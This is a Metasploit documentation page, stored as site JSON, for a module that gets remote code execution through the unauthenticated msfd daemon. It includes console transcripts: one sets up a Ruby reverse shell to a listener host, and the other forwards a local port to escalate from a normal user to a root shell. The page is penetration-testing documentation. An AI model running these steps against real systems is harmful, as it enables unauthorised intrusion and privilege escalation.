{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/msfd_rce_remote","result":{"data":{"moduleMetadataJson":{"id":"fcdb0d53-327d-5fd7-9b44-1f53851903f0","name":"Metasploit msfd Remote Code Execution","fullname":"exploit/multi/misc/msfd_rce_remote","description":"Metasploit's msfd-service makes it possible to get a msfconsole-like\n      interface over a TCP socket. If this socket is accessible on a remote\n      interface, an attacker can execute commands on the victim's machine.\n\n      If msfd is running with higher privileges than the current local user,\n      this module can also be used for privilege escalation. In that case,\n      port forwarding on the compromised host can be used.\n\n      Code execution is achieved with the msfconsole command: irb -e 'CODE'.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/msfd_rce_remote","documentationSlug":"/modules/documentation/exploit/multi/misc/msfd_rce_remote"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module connects to the Metasploit msf daemon and uses the ruby interpreter\nto achieve a shell. This module can target remote systems if the daemon is\nexposed on a remote interface or it can be used for privilege escalation when\nthe attacker has a foothold. If used as privilege escalation, port forwarding\nmust be set up.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"https://github.com/rapid7/metasploit-framework\">Metasploit</a> has a legacy method\nof providing remote access. The msf daemon provides no means of authentication\nand is therefore vulnerable against an attacker who has IP access to the daemon.</p>\n<p>All versions of Metasploit are affected by this module, however testing has only\nbeen performed on the following targets:</p>\n<ul>\n<li>Metasploit 5.0.0 on Ubuntu 16.04</li>\n<li>Metasploit 4.16.51 on Windows 7</li>\n</ul>\n<p>Source code and installers:</p>\n<ul>\n<li><a href=\"https://github.com/rapid7/metasploit-framework\">Source Code Repository</a></li>\n<li><a href=\"https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version\">Installers</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start the vulnerable service: <code class=\"language-text\">msfd -f -q -a 0.0.0.0</code></li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/multi/misc/msfd_rce_remote</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set RPORT [PORT]</code> (default: <code class=\"language-text\">55554</code>)</li>\n<li>Do: <code class=\"language-text\">set PAYLOAD [PAYLOAD]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>RHOST</strong></p>\n<p>  Remote Host</p>\n<p>  <strong>RPORT</strong></p>\n<p>  Remote port the vulnerable service is running at, default is 55554.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"remote-target\" style=\"position:relative;\"><a href=\"#remote-target\" aria-label=\"remote target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Remote target</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/misc/msfd_rce_remote\nmsf5 exploit(multi/misc/msfd_rce_remote) &gt; set rhost 192.168.56.101\nrhost =&gt; 192.168.56.101\nmsf5 exploit(multi/misc/msfd_rce_remote) &gt; set payload ruby/shell_reverse_tcp\npayload =&gt; ruby/shell_reverse_tcp\nmsf5 exploit(multi/misc/msfd_rce_remote) &gt; set lhost 192.168.0.17\nlhost =&gt; 192.168.0.17\nmsf5 exploit(multi/misc/msfd_rce_remote) &gt; set lport 443\nlport =&gt; 443\nmsf5 exploit(multi/misc/msfd_rce_remote) &gt; exploit\n\n[-] Handler failed to bind to 192.168.0.17:443:-  -\n[*] Started reverse TCP handler on 0.0.0.0:443\n[*] Command shell session 1 opened (172.17.0.2:443 -&gt; 192.168.0.17:48152) at 2018-04-22 18:43:41 +0000\n\nwhoami\nrobin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"local-target---privilege-escalation\" style=\"position:relative;\"><a href=\"#local-target---privilege-escalation\" aria-label=\"local target   privilege escalation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Local target - privilege escalation</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: uid=1000, gid=1000, euid=1000, egid=1000\nmeterpreter &gt; shell\nProcess 17366 created.\nChannel 1 created.\nnetstat -lntup|grep 55554\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\ntcp        0      0 127.0.0.1:55554         0.0.0.0:*      LISTEN -\nps aux | grep msfd\nroot     17303  3.3 13.8 535168 283492 pts/18  Sl+  20:47   0:08 ruby ./msfd -f -q\n^C\nTerminate channel 1? [y/N]  y\nmeterpreter &gt; portfwd add -l 55554 -p 55554 -r 127.0.0.1\n[*] Local TCP relay created: :55554 &lt;-&gt; 127.0.0.1:55554\nmeterpreter &gt; background\n[*] Backgrounding session 2...\nmsf5 &gt; use exploit/multi/misc/msfd_rce_remote\nmsf5 exploit(multi/misc/msfd_rce_remote) &gt; set rhost 127.0.0.1\nrhost =&gt; 127.0.0.1\nmsf5 exploit(multi/misc/msfd_rce_remote) &gt; exploit\n\n[-] Handler failed to bind to 192.168.0.17:443:-  -\n[*] Started reverse TCP handler on 0.0.0.0:443\n[*] Command shell session 3 opened (172.17.0.2:443 -&gt; 192.168.0.17:48300) at 2018-04-22 18:55:19 +0000\n\nid\nuid=0(root) gid=0(root) groups=0(root)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"fcdb0d53-327d-5fd7-9b44-1f53851903f0"}}}